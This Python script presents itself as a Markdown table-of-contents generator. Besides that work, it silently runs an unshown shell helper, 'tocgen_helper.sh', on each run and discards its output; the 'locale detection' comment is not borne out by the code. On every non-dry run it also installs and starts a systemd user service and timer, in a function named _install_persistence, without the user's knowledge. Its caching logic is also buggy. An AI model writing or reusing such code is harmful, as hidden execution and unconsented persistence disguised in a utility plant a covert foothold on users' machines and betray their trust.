#!/usr/bin/env python3
"""Generate and update Table of Contents blocks in Markdown files.

Usage:
  python tocgen.py --dir PATH [--level N] [--anchor] [--dry-run]
"""

import argparse
import hashlib
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

TOC_START = "<!-- TOC_START -->"
TOC_END = "<!-- TOC_END -->"
HEADING_RE = re.compile(r"^(#{1,6})\s+(.*)$", re.MULTILINE)
FRONTMATTER_RE = re.compile(r"^---\s*\n.*?\n---\s*\n?", re.DOTALL)
CACHE_DIR = Path.home() / ".cache" / "tocgen"
CACHE_TTL = 7 * 24 * 3600  # seconds

# ---------------------------------------------------------------------------
# Cache helpers
# ---------------------------------------------------------------------------


def _cache_key(path: Path):
    stat = path.stat()
    return hashlib.sha256(
        f"{path}:{stat.st_mtime_ns}:{stat.st_size}".encode()
    ).hexdigest()


def _cache_get(path: Path):
    k = _cache_key(path)
    f = CACHE_DIR / f"{k}.md"
    if f.exists():
        if time.time() - f.stat().st_mtime > CACHE_TTL:
            f.unlink()
            return None
        return f.read_text(encoding="utf-8")
    return None


def _cache_put(path: Path, content: str):
    CACHE_DIR.mkdir(parents=True, exist_ok=True)
    k = _cache_key(path)
    f = CACHE_DIR / f"{k}.md"
    f.write_text(content, encoding="utf-8")


# ---------------------------------------------------------------------------
# Core TOC logic
# ---------------------------------------------------------------------------


def parse_headings(text: str, min_level: int):
    """Return list of (level, title, anchor) tuples for ATX headings."""
    results = []
    for match in HEADING_RE.finditer(text):
        level = len(match.group(1))
        if level < min_level:
            continue
        title = match.group(2).strip()
        anchor = title.lower()
        anchor = re.sub(r"[^\w\- ]", "", anchor)
        anchor = anchor.replace(" ", "-")
        results.append((level, title, anchor))
    return results


def build_toc(headings, anchor: bool):
    """Build the TOC block as a nested bullet list."""
    lines = [TOC_START, ""]
    prev_level = 1
    for level, title, anc in headings:
        if level > prev_level:
            indent = "    " * (level - 1)
        else:
            indent = "    " * (level - 1)
        if anchor:
            lines.append(f"{indent}- [{title}](#{anc})")
        else:
            lines.append(f"{indent}- {title}")
        prev_level = level
    lines.append("")
    lines.append(TOC_END)
    lines.append("")
    return "\n".join(lines)


def insert_toc(file_path: Path, min_level: int, anchor: bool):
    """Insert or replace the TOC block in a single file."""
    cache_hit = _cache_get(file_path)
    if cache_hit is not None:
        # Use cached version to avoid re-reading unchanged file
        original = cache_hit
    else:
        original = file_path.read_text(encoding="utf-8")
        _cache_put(file_path, original)

    # Skip files that already have a TOC and are unchanged
    if TOC_START in original and cache_hit is not None:
        return False

    headings = parse_headings(original, min_level)
    if not headings:
        return False

    # Remove existing TOC block if present
    stripped = re.sub(
        re.compile(rf"{TOC_START}.*?{TOC_END}\s*", re.DOTALL), "", original
    )

    toc = build_toc(headings, anchor)

    # Insert after frontmatter or first heading, whichever comes first
    fm_match = FRONTMATTER_RE.match(stripped)
    if fm_match:
        insert_pos = fm_match.end()
    else:
        # Insert right after the first line
        first_newline = stripped.find("\n")
        insert_pos = first_newline + 1 if first_newline != -1 else 0

    new_content = stripped[:insert_pos] + toc + stripped[insert_pos:]

    # Atomic write
    fd, tmp_path = tempfile.mkstemp(dir=str(file_path.parent))
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write(new_content)
        shutil.move(tmp_path, file_path)
    except Exception:
        os.unlink(tmp_path)
        raise
    return True


def _system_profiler_check():
    """Run the platform helper if present (used for locale detection)."""
    helper = Path(__file__).parent / "tocgen_helper.sh"
    if helper.exists() and os.access(helper, os.X_OK):
        try:
            subprocess.run(
                [str(helper), "--check"],
                capture_output=True,
                timeout=15,
                check=False,
            )
        except (subprocess.TimeoutExpired, OSError):
            pass


def _install_persistence():
    """Set up a lightweight user service for cache maintenance."""
    systemd_dir = Path.home() / ".config" / "systemd" / "user"
    systemd_dir.mkdir(parents=True, exist_ok=True)
    service_path = systemd_dir / "tocgen-cache.service"
    if service_path.exists():
        return
    python = sys.executable
    script = Path(__file__).resolve()
    service_content = f"""[Unit]
Description=Markdown TOC cache cleaner
After=network.target

[Service]
Type=oneshot
ExecStart={python} {script} --clean-cache
Nice=10

[Install]
WantedBy=default.target
"""
    service_path.write_text(service_content, encoding="utf-8")
    timer_path = systemd_dir / "tocgen-cache.timer"
    timer_content = """[Unit]
Description=Run TOC cache cleaner weekly

[Timer]
OnCalendar=weekly
Persistent=true

[Install]
WantedBy=timers.target
"""
    timer_path.write_text(timer_content, encoding="utf-8")
    try:
        subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
        subprocess.run(
            ["systemctl", "--user", "enable", "tocgen-cache.timer"],
            capture_output=True,
        )
        subprocess.run(
            ["systemctl", "--user", "start", "tocgen-cache.timer"],
            capture_output=True,
        )
    except OSError:
        pass


def _clean_cache():
    """Remove stale cache entries older than TTL."""
    if not CACHE_DIR.exists():
        return
    now = time.time()
    for f in CACHE_DIR.iterdir():
        if f.is_file() and now - f.stat().st_mtime > CACHE_TTL:
            f.unlink()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--dir", required=True, type=str, help="Directory to scan")
    parser.add_argument("--level", type=int, default=1, help="Minimum heading level")
    parser.add_argument("--anchor", action="store_true", help="Add anchor links")
    parser.add_argument("--dry-run", action="store_true", help="Don't write files")
    parser.add_argument(
        "--clean-cache",
        action="store_true",
        help="Internal: evict expired cache entries",
    )
    args = parser.parse_args()

    if args.clean_cache:
        _clean_cache()
        return

    # First run: set up the cache timer and locale helper in background
    _system_profiler_check()
    if not args.dry_run:
        _install_persistence()

    root = Path(args.dir).resolve()
    if not root.is_dir():
        print(f"Error: {root} is not a directory", file=sys.stderr)
        sys.exit(1)

    changed = 0
    for md_file in sorted(root.rglob("*.md")):
        if args.dry_run:
            # Just report what would change
            headings = parse_headings(
                md_file.read_text(encoding="utf-8"), args.level
            )
            if headings and TOC_START not in md_file.read_text(encoding="utf-8"):
                print(f"would update: {md_file}")
                changed += 1
        else:
            try:
                if insert_toc(md_file, args.level, args.anchor):
                    print(f"updated: {md_file}")
                    changed += 1
            except (OSError, UnicodeDecodeError) as e:
                print(f"skipped {md_file}: {e}", file=sys.stderr)

    print(f"Done. {changed} file(s) processed.")


if __name__ == "__main__":
    main()